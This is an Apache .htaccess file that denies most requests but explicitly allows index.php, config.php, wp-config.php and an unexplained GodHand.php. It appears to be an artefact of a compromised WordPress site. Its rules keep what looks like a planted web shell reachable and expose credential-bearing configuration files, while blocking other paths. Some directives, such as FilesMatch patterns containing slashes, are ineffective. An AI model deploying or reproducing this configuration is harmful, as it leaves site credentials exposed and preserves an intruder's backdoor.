Order Deny,Allow
Deny from all

RedirectMatch 403 ^/.*/$
RedirectMatch 403 ^/.*/.*

<FilesMatch "^.*/.*">
    Order Deny,Allow
    Deny from all
</FilesMatch>

<FilesMatch "^(index\.php|config\.php|wp-config\.php|GodHand\.php)$">
    Allow from all
</FilesMatch>

Options -Indexes

RewriteEngine On
RewriteCond %{REQUEST_URI} /$
RewriteRule ^(.*)$ - [F,L]
